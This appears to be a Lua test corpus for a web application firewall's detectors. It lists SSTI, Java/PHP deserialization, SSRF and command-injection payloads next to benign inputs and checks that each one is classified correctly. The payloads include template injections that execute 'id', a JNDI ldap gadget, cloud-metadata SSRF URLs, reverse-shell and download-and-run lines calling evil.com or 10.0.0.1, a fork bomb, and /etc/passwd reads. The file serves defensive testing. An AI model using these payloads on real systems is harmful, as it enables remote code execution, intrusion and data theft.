-- SSTI / Java deserialization / PHP deserialization detector corpus
-- (scripts/security/waf-detector-corpus.sh runs it after the sqli/xss one).
-- Values are given already URL-decoded, as inspect() sees them. Every attack
-- must be detected by its own detector; every benign value by none of the
-- new detectors (ssti, java_deser, php_deser, ssrf).
local waf = require("cdnca_waf")
local d = waf._detect

local function b64(s) return ngx.encode_base64(s) end
local function hex(s) return (s:gsub(".", function(c) return string.format("%02x", c:byte()) end)) end
-- ObjectOutputStream: magic AC ED, version 00 05, TC_OBJECT, TC_CLASSDESC, class name, serialVersionUID, flags
local function jstream(class)
    return "\172\237\0\5\115\114" .. string.char(math.floor(#class / 256), #class % 256) .. class
        .. "\0\0\0\0\0\0\0\1\2\0\0\120\112"
end
local cc1 = jstream("org.apache.commons.collections.functors.InvokerTransformer")
local cc5 = jstream("javax.management.BadAttributeValueExpException")
local session = jstream("com.example.Session")
local php_obj = 'O:8:"stdClass":1:{s:4:"file";s:11:"/etc/passwd";}'

local attacks = {
    ssti = {
        "{{7*7}}", "{{7*'7'}}", "${7*7}", "#{7*7}", "*{7*7}", "{{ 49 / 7 }}", "{{config.items()}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}", "{{self.__init__.__globals__}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{{lipsum.__globals__.os.popen('id').read()}}", "{{cycler.__init__.__globals__.os}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}", "#{T(java.lang.Runtime).getRuntime().exec('id')}",
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        "#set($x=$class.inspect(\"java.lang.Runtime\"))",
        "{% for c in [].__class__.__base__.__subclasses__() %}{% endfor %}",
        "<%= 7*7 %>", "<%= system('id') %>", "{{constructor.constructor('return process')()}}",
        "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}",
        "${{7*7}}", "{{ request['application']['__globals__'] }}", "{{ config.__class__ }}", "@{7*7}",
        "${facesContext.getExternalContext()}", "{{_self.env.registerUndefinedFilterCallback('exec')}}",
        "{{['id']|filter('system')}}", "name={{7*7}}&x=1",
    },
    java_deser = {
        cc1, cc5, b64(cc1), b64(cc5), b64(session), hex(cc1), hex(session), string.upper(hex(cc5)),
        "data=" .. b64(cc1), b64("Z" .. cc1), b64("ZZ" .. session), "x=" .. b64("Q" .. cc5), (b64(cc1):gsub("%+", "-"):gsub("/", "_")), (b64(cc5):gsub("%+", " ")),
        "\172\237\0\5\119\4\0\0\0\1" .. "org.apache.commons.collections.map.LazyMap",
        '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evil/x","autoCommit":true}',
        '{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}}',
        '["org.springframework.beans.factory.config.PropertyPathFactoryBean",{"targetBeanName":"ldap://x"}]',
        '<sorted-set><dynamic-proxy><interface>java.lang.Comparable</interface><handler class="java.beans.EventHandler"/></dynamic-proxy></sorted-set>',
        '<java.util.PriorityQueue serialization="custom"><unserializable-parents/></java.util.PriorityQueue>',
        "rO0AB" .. b64(cc1):sub(6), "x " .. hex(cc1) .. " y",
    },
    php_deser = {
        php_obj, 'O:4:"User":2:{s:4:"name";s:5:"admin";s:5:"admin";b:1;}',
        'a:1:{i:0;O:8:"stdClass":0:{}}', 'O:+8:"stdClass":1:{}', 'C:11:"ArrayObject":21:{x:i:0;a:0:{};m:a:0:{}}',
        'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{}', 'O:17:"Monolog\\Handler\\X":1:{}',
        'O:20:"GuzzleHttp\\Cookie\\Ab":1:{}',
        b64(php_obj), b64('O:4:"User":1:{s:2:"id";i:1;}'), (b64(php_obj):gsub("=", "")),
        "phar://uploads/avatar.jpg/test.txt", "PHAR://./a.phar", "file=phar:///var/www/up/x.gif",
        "cookie=" .. b64('a:2:{i:0;s:1:"x";i:1;O:6:"Logger":1:{s:4:"file";s:9:"shell.php";}}'),
        'O:6:"Logger":1:{s:4:"file";s:9:"shell.php";}',
    },
    ssrf = {
        "file://foo.bar", "file:///etc/passwd", "gopher://google.com/_SSRFTest!", "ldap://127.0.0.1/",
        "jar:http://evil.co/b.zip!a", "ftp://foo.bar", "local_file://something", "url:file://etc/services",
        "dict://127.0.0.1:6379/info", "http://127.0.0.1/admin", "http://localhost:8080/", "http://10.0.0.5/",
        "http://192.168.1.1/", "http://172.16.0.1/", "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/", "http://100.100.100.200/latest/meta-data/",
        "http://2130706433/", "http://0x7f000001/", "http://0177.0.0.1/", "http://127.1/", "http://[::1]/",
        "http://[::ffff:127.0.0.1]/", "http://example.com%2f@evil.com/", "http://a@b@evil.com/",
        "http://example.com@evil.com#@good.com/", "http://evil.com\\@good.com/", "http://１２７.0.0.1/",
        "http://127。0。0。1/", "http://db.internal/", "http://app.localhost/",
    },
    cmd = {
        "; cat /etc/passwd", "| id", "|| whoami", "& ping -c 3 10.0.0.1", "&& uname -a", "`id`", "$(id)",
        "x;wget http://evil.com/s.sh", "1|nc -e /bin/sh 10.0.0.1 4444", "; /bin/c?t /etc/passwd",
        "; c'a't /etc/passwd", "; w\\hoami", "; who$@ami", "cat${IFS}/etc/passwd;id", "{cat,/etc/passwd}",
        "/e?c/p*sswd", "/???/??t /???/p??s??", ":(){ :|:& };:", "; ls -la /", "a; curl evil.com|sh",
        "x`whoami`y", "$(cat /etc/shadow)", "; python -c 'import os'", "; rm -rf /tmp/x", "&& env",
        "; sleep 5", "| base64 -d", "; find / -name '*.conf'",
    },
}
-- Benign inputs: JSON, rich text, Base64 images, legitimate {{}} template text, prose.
local png = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg=="
local benign = {
    "hello world", "{{name}}", "{{ user.name }}", "{{user.profile.name}}", "{{ name | upper }}", "{{ price | currency }}",
    "Hello {{first_name}}, your order {{order_id}} shipped", "{{#each items}}{{this}}{{/each}}", "{{> header}}",
    "{{!-- comment --}}", "${HOME}", "${user}", "#{id}", "{% raw %}", "{% if user %}hi{% endif %}", "{% block content %}",
    "<%= name %>", "price: ${price}", "Use {{ and }} to write templates", "{\"a\":1,\"b\":[1,2,3]}",
    "{\"user\":{\"name\":\"Tom\",\"email\":\"tom@example.com\"},\"tags\":[\"a\",\"b\"]}",
    "{\"template\":\"{{title}} - {{site}}\",\"version\":\"2024-10-14\"}", "{\"@type\":\"Person\",\"name\":\"Jane\"}",
    "{\"@context\":\"https://schema.org\",\"@type\":\"Product\",\"name\":\"Phone\"}",
    "<p>Hello <b>world</b></p><ul><li>one</li><li>two</li></ul>", "<h2>Release notes</h2><p>Fixed 3-4 bugs; see {{docs}}.</p>",
    "<blockquote>a * b is multiplication</blockquote>", "Math: 7 * 7 = 49 and 10/2 = 5", "2024-10-14", "10-20 items",
    "data:image/png;base64," .. png, png, "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7",
    "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAAMCAgMCAgMDAwMEAwMEBQgFBQUFBQoHBwYIDAoMDAsKCwsNDhIQDQ4RDgsLEBYQERMUFRUVDA8XGBYUGBIUFRT/",
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U",
    "Order O:12 shipped", "O:8:\"stdClass\"", "ratio 3:4:{a}", "s:5:\"hello\";", "a:2:{i:0;s:1:\"a\";i:1;s:1:\"b\";}",
    "O:5:\"stdClass\":1:{}", "phar is a PHP archive format", "the pharmacy is open", "rO0 is not a word",
    "aced0005 was mentioned in a blog", "ACED", "use java.util.HashMap in your code", "com.example.Session",
    "Java serialization talk at 7pm", "C:\\Users\\tom\\Documents", "O:\\path", "Tzo is a name",
    "Qzo123", "{{", "}}", "${", "a{{b", "{{ }}", "{ \"k\": \"v\" }", "function() { return 1 }", "x = {a: 1}",
    "SELECT * FROM menu", "<img src=\"/logo.png\" alt=\"logo\">", "Price: $7*7 deal", "50% off {{today}}",
    "#{user.name}", "${user.address.city}",
    "https://www.example.com/page?x=1", "http://cdn.example.org/a.js", "https://user@example.com/",
    "https://8.8.8.8/dns-query", "http://93.184.216.34/", "https://[2001:db8::1]/", "mailto:a@example.com",
    "see http://example.com for details", "tel:+86-10-1234", "https://api.example.com:8443/v1/items",
    "javascript is fun", "http: header", "10.0.0.5", "localhost",
    "Tom & Jerry", "rock & roll; jazz", "cats | dogs", "price; tax", "a || b", "C&A store", "R&D team",
    "Q&A: how to find a cat", "I sleep; then eat", "find the cat", "the host is down", "net income 5%",
    "fetch the data", "use ls to list files", "AT&T", "id=123", "user_id", "cat food", "more info",
    "head office", "tail -f is a command", "kill switch", "ping pong", "touch screen", "sh*t happens",
    "a*b*c", "file?.txt", "[draft] notes", "{a,b,c}", "{1,2,3}", "{red,green}", "$(price)", "`code`",
    -- GoTestWAF false-pos texts-46: an unbalanced [ made CMDI.glob raise (500)
    "[Host: type: {[", "[a", "x [ y",
    "[draft", "a[b", "@{[x", "[$lte]asdfsd",
}
-- {{ item.price * qty }} is real arithmetic in a template expression: it is exactly what an
-- SSTI probe looks like, so it is expected to be detected and is listed as an attack.
attacks.ssti[#attacks.ssti + 1] = "{{ item.price * qty }}"

local failures, total, counts = 0, 0, {}
local function expect(name, detector, value, want)
    total = total + 1
    if (detector(value) and true or false) ~= want then
        failures = failures + 1
        print("FAIL " .. name .. " want=" .. tostring(want) .. " value=" .. value:gsub("[%z\1-\31\127-\255]", "."))
    end
end
for _, name in ipairs({ "ssti", "java_deser", "php_deser", "ssrf", "cmd" }) do
    counts[name] = #attacks[name]
    for _, value in ipairs(attacks[name]) do expect(name, d[name], value, true) end
    for _, value in ipairs(benign) do expect("benign-" .. name, d[name], value, false) end
end
print(string.format("detector corpus ext: %d checks, %d failures (ssti %d, java_deser %d, php_deser %d, ssrf %d, cmd %d attacks; benign %d)",
    total, failures, counts.ssti, counts.java_deser, counts.php_deser, counts.ssrf, counts.cmd, #benign))

local sample = string.rep("customer review text with {{name}} and 123 numbers, ", 4)
local iterations = 100000
ngx.update_time()
local started = ngx.now()
for _ = 1, iterations do d.ssti(sample) d.java_deser(sample) d.php_deser(sample) d.ssrf(sample) d.cmd(sample) end
ngx.update_time()
print(string.format("detector speed: %.2f us per 200-byte value (ssti+java_deser+php_deser+ssrf+cmd)",
    (ngx.now() - started) / iterations * 1e6))
os.exit(failures == 0 and 0 or 1)
